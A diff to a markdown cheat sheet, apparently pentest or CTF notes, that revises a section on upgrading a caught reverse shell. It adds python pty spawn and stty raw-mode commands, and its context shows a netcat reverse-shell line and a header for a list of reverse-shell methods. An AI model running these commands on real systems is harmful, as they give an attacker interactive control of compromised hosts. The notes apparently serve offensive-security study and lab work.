@@ -8,9 +8,9 @@
 -  - `nc 127.0.0.1 8888 -e /bin/sh`
 
 - Upgrade to a shell (Use the bash when doing this. zsh doesn't seem to work)
--  - `python3 -c 'import pty; pty.spawn("/bin/sh")'`
--  - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
--  - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
+-  - `python3 -c 'import pty; pty.spawn("/bin/sh")'` or `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+-  - (CTRL + Z) then `stty raw -echo; fg; ls; export SHELL=/bin/sh; export TERM=screen; stty rows 38 columns 116; reset;`
+-  - Read more https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
 
 
 ### A long list of ways to create a reverse shell
